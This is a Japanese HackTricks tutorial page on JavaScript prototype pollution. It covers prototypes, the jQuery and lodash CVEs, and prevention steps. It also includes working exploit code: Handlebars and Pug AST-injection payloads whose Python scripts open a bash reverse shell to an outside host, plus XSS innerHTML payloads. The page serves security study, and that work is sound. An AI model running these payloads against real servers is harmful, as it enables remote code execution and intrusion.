# NodeJS - \_\_proto\_\_ & prototype Pollution

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**または[telegramグループ](https://t.me/peass)に**参加**するか、**Twitter** 🐦で私をフォローする [**@carlospolopm**](https://twitter.com/carlospolopm)。
- **ハッキングトリックを共有するには、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>

## JavaScriptのオブジェクト <a href="#053a" id="053a"></a>

まず最初に、JavaScriptにおける`Object`を理解する必要があります。オブジェクトは単純に、そのオブジェクトのプロパティと呼ばれるキーと値のペアのコレクションです。例えば：

![](<../../../.gitbook/assets/image (389) (1).png>)

JavaScriptでは、`Object`は基本オブジェクトであり、新しく作成されたすべてのオブジェクトのテンプレートです。`Object.create`に`null`を渡すことで空のオブジェクトを作成することが可能です。ただし、新しく作成されたオブジェクトは、渡されたパラメータに対応するタイプを持ち、すべての基本プロパティを継承します。
```javascript
console.log(Object.create(null)); // prints an empty object
```
![](<../../../.gitbook/assets/image (360).png>)

以前に、JavaScriptのオブジェクトはキーと値のコレクションであることを学びました。そのため、`null`オブジェクトは単なる空の辞書`{}`であることは理にかなっています。

## JavaScriptにおける関数/クラス <a href="#55dd" id="55dd"></a>

JavaScriptでは、クラスと関数の概念は非常に関連しています（関数自体がクラスのコンストラクタとして機能し、実際の性質にはJavaScriptにおける「クラス」という概念はありません）。次の例を見てみましょう：
```javascript
function person(fullName, age) {
this.age = age;
this.fullName = fullName;
this.details = function() {
return this.fullName + " has age: " + this.age;
}
}
```
![](<../../../.gitbook/assets/image (361).png>)
```javascript
var person1 = new person("Satoshi", 70);
```
![](<../../../.gitbook/assets/image (362).png>)

## JavaScriptにおけるプロトタイプ <a href="#3843" id="3843"></a>

重要な点の1つは、コードを実行する際にプロトタイプ属性を変更/修正/削除できることです。たとえば、クラスに関数を動的に追加できます：

![](<../../../.gitbook/assets/image (363).png>)

クラスの関数は変更されることもあります（`toString`や`valueOf`などの場合）：

![](<../../../.gitbook/assets/image (364).png>)

![](<../../../.gitbook/assets/image (365).png>)

## 継承

プロトタイプベースのプログラムでは、オブジェクトはクラスからプロパティ/メソッドを継承します。クラスは、他のクラスのインスタンスにプロパティ/メソッドを追加することによって派生されるか、空のオブジェクトに追加することによって派生されます。

注意すべきは、オブジェクトにプロパティを追加すると（myPersonObjのようにオブジェクトが一連のオブジェクトのプロトタイプとして使用される場合）、そのプロトタイプとして使用されるオブジェクトも新しいプロパティを取得しますが、そのプロパティは明示的に呼び出されない限り表示されません。

![](<../../../.gitbook/assets/image (366).png>)

## \_\_proto\_\_の汚染 <a href="#0d0a" id="0d0a"></a>

すでに学んでいるはずですが、**JavaScriptのすべてのオブジェクトは単にキーと値のコレクション**であり、**JavaScriptのすべてのオブジェクトはObject型から継承**していることです。これは、Object型を汚染できれば、**環境内のすべてのJavaScriptオブジェクトが汚染される**ということを意味します！

これは非常に簡単で、任意のJavaScriptオブジェクトのいくつかのプロパティ（キーと値のペア）を変更できればよいだけです。なぜなら、各オブジェクトがObjectを継承しているため、各オブジェクトがObjectスキームにアクセスできるからです。
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
```
前の例から、次の方法を使用してObjectの構造にアクセスすることが可能です：
```javascript
person1.__proto__.__proto__
person.__proto__.__proto__
```
したがって、もし今プロパティがObjectスキームに追加された場合、すべてのJavaScriptオブジェクトが新しいプロパティにアクセスできるようになります:
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person1.__proto__.__proto__.printHello = function(){console.log("Hello");}
person1.printHello() //This now works and prints hello
//Add constant as new property
person1.__proto__.__proto__.globalconstant = true
person1.globalconstant  //This now works and is "true"
```
それぞれのJSオブジェクトには、新しいプロパティである`printHello`関数と新しい定数`globalconstant`が含まれるようになりました。

## プロトタイプ汚染

このテクニックは、JSオブジェクトのスキームを汚染することはできないため、前のテクニックほど効果的ではありません。ただし、**キーワード`__proto__`が禁止されている場合には、このテクニックが役立つ**ことがあります。

関数のプロパティを変更できる場合、関数の`prototype`プロパティを変更でき、**ここに追加した各新しいプロパティは、その関数から作成された各オブジェクトに継承されます:**
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person.prototype.sayHello = function(){console.log("Hello");}
person1.sayHello() //This now works and prints hello
//Add constant as new property
person.prototype.newConstant = true
person1.newConstant //This now works and is "true"

//The same could be achieved using this other way:
person1.constructor.prototype.sayHello = function(){console.log("Hello");}
person1.constructor.prototype.newConstant = true
```
この場合、`person` クラスから作成された**オブジェクトのみが影響を受けます**が、それぞれが今では `sayHello` と `newConstant` のプロパティを**継承**します。

**すべてのJSオブジェクトを汚染するためにプロトタイプ汚染を悪用する方法は2つあります。**

最初の方法は、**Object** のプロパティプロトタイプを汚染することです（前述のように、すべてのJSオブジェクトはこれから継承されます）:
```javascript
Object.prototype.sayBye = function(){console.log("bye!")}
```
もしそれに成功すれば、各JSオブジェクトは`sayBye`関数を実行できるようになります。

別の方法は、次の例のように、辞書変数のコンストラクタのプロトタイプを汚染することです：
```javascript
something = {"a": "b"}
something.constructor.prototype.sayHey = function(){console.log("Hey!")}
```
実行した後、**各JSオブジェクトは`sayHey`関数を実行できる**ようになります。

## 他のオブジェクトを汚染する

### クラスからObject.prototypeへ

特定のオブジェクトを**汚染**し、**`Object.prototype`に到達する必要がある**シナリオでは、次のようなコードでそれを検索できます:
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### 配列要素の汚染

JSのオブジェクトの属性を汚染できるように、配列を汚染する権限がある場合、**インデックスでアクセス可能な配列の値も汚染できます**（値を上書きすることはできないため、書き込まれていないが何らかの方法で使用されているインデックスを汚染する必要があります）。
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Html要素の汚染

JSを使用してHTML要素を生成する際、**`innerHTML`**属性を**上書き**して**任意のHTMLコード**を書き込むことが可能です。[この解説と例はこちらから](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/)。
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## 例

### 基本的な例

プロトタイプ汚染はどこにあるのでしょうか？それは、`Object.prototype`のプロパティを上書きできるアプリケーションのバグが発生したときに起こります。典型的なオブジェクトは、そのプロパティを`Object.prototype`から継承するため、アプリケーションの動作を変更できます。最も一般的に示される例は次のとおりです：
```javascript
if (user.isAdmin) {   // do something important!}
```
想像してみてください。`Object.prototype.isAdmin = true`を設定できるプロトタイプ汚染が発生した場合、アプリケーションが明示的に値を割り当てていない限り、`user.isAdmin`は常にtrueになります！

![](https://research.securitum.com/wp-content/uploads/sites/2/2019/10/image-1.png)

例えば、`obj[a][b] = value`。攻撃者が`a`と`value`の値を制御できる場合、`a`の値を`__proto__`に調整するだけで、アプリケーション内のすべての既存オブジェクトのプロパティ`b`が`value`に割り当てられます。

ただし、攻撃は上記のように単純ではありません。[論文](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript\_prototype\_pollution\_attack\_in\_NodeJS.pdf)によると、次の3つの条件のいずれかが満たされた場合にのみ攻撃が可能です：

* 再帰マージを実行する
* パスによるプロパティ定義
* オブジェクトのクローン

### 関数の上書き
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Proto Pollution to RCE

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## クライアントサイドのプロトタイプ汚染からXSSへ

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019–11358: jQuery $ .extendを介したプロトタイプ汚染攻撃

$ .extendは、誤って処理されると、オブジェクト`prototype`（アプリ内のオブジェクトのテンプレート）のプロパティを変更できます。この属性はその後、すべてのオブジェクトに表示されます。注意すべきは、$ .extenedの「深い」バージョン（つまりg）のみが影響を受けるということです。

プログラマーは、この関数をオブジェクトを複製したり、デフォルトオブジェクトから新しいプロパティを埋めるためによく使用します。例：

`myObject`がユーザーからの入力フィールドであり、DBにシリアル化されると想像できます）

このコードでは、実行時に新しく作成されたオブジェクトに属性`isAdmin`が割り当てられると考えがちです。しかし、実際には、それは直接`{}`に割り当てられ、その後`{}.isAdmin`は`true`になります。このコードの後に、次のチェックを実行するとします：
```javascript
If (user.isAdmin === true) {
// do something for admin
}
```
もしユーザーがまだ存在していない場合（ `undefined` ）、`isAdmin`プロパティは、その親オブジェクト内で検索されます。この親オブジェクトには、上記で値が`true`に設定された`isAdmin`が追加されています。

JQuery 3.3.1で実行した場合の別の例：
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))
console.log({}.devMode); // true
```
これらのエラーは、特にNodeJSプロジェクトに多大な影響を与える可能性があります。最も実用的な例は、2018年12月にMongooseで発生したエラーです。

### CVE-2018–3721、CVE-2019–10744: lodashを介したプロトタイプ汚染攻撃

[Lodash](https://www.npmjs.com/package/lodash)は、19ミリオン以上の週間ダウンロード数を誇り、コードをより便利かつ整然と書くのに役立つ多くの異なる機能を提供するよく知られたライブラリです。そして、JQueryと同じ問題が発生しました。

**CVE-2018–3721**

**CVE-2019–10744**

このバグは、すべてのバージョンのLodashに影響を与えますが、バージョン4.17.11で修正されています。

### 他のCVEを含むチュートリアル

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

### NodeJSにおけるASTプロトタイプ汚染

NodeJSは、テンプレートエンジンやTypeScriptなどの機能においてJavaScriptの抽象構文木（AST）を広範に利用しています。このセクションでは、テンプレートエンジンであるHandlebarsとPugに関連するプロトタイプ汚染に関する脆弱性について探ります。

#### Handlebarsの脆弱性分析

Handlebarsテンプレートエンジンは、プロトタイプ汚染のために悪用される可能性があります。この脆弱性は、`javascript-compiler.js`ファイル内の`appendContent`および`pushSource`関数に主にあります。ここで、`appendContent`は`pendingContent`を連結し、`pushSource`はソースをプッシュした後に`pendingContent`を`undefined`に設定します。

##### 悪用プロセス

悪用は、Handlebarsによって生成されたASTを操作することを含みます。プロセスは次のとおりです：

1. **パーサーの操作**: パーサーは、`NumberLiteral`ノードを介して値を数値に強制します。ただし、これはプロトタイプ汚染によってバイパスされ、非数値文字列の挿入が可能になります。
2. **コンパイラの処理**: コンパイラはASTオブジェクトまたはテンプレート文字列のいずれかを受け入れます。`input.type`が`Program`である場合、入力は事前に解析されたものと見なされ、悪用の可能性があります。
3. **コードインジェクション**: `Object.prototype`を操作することで、任意のコードをテンプレート関数に注入し、潜在的なリモートコード実行を引き起こすことができます。

Handlebarsの脆弱性悪用の例：
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];

const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());
```
上記のコードは、攻撃者がHandlebarsテンプレートに任意のコードをインジェクトする方法を示しています。

**外部参照**: [ 'flat'ライブラリにおけるプロトタイプ汚染に関連する問題](https://github.com/hughsk/flat/issues/105)

Pythonにおけるプロトタイプ汚染の例:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
#### Pugの脆弱性

Handlebarsと同様に、Pugもプロトタイプ汚染を介して悪用される可能性があります。詳細は[AST Injection in Pug](https://blog.p6.is/AST-Injection/#Pug)で確認できます。

Pugにおけるプロトタイプ汚染の例：
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
### 予防策

プロトタイプ汚染のリスクを軽減するために、以下の戦略を考慮してください：

1. **オブジェクトの不変性**：`Object.freeze`を使用して`Object.prototype`を不変にします。
2. **入力の検証**：アプリケーションのスキーマに基づいてJSON入力を厳密に検証します。
3. **安全なマージ関数**：危険な再帰マージ関数の使用を避けます。
4. **プロトタイプのないオブジェクト**：プロトタイププロパティを持たないオブジェクトを作成するために`Object.create(null)`を使用します。
5. **Mapの使用**：キーと値のペアには`Object`の代わりに`Map`を選択します。
6. **ライブラリの更新**：定期的にライブラリを更新してセキュリティパッチを組み込みます。



## 参考文献

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
* [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>!</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手してください
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションを見つけます
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)をフォローしてください。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks)のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。

</details>
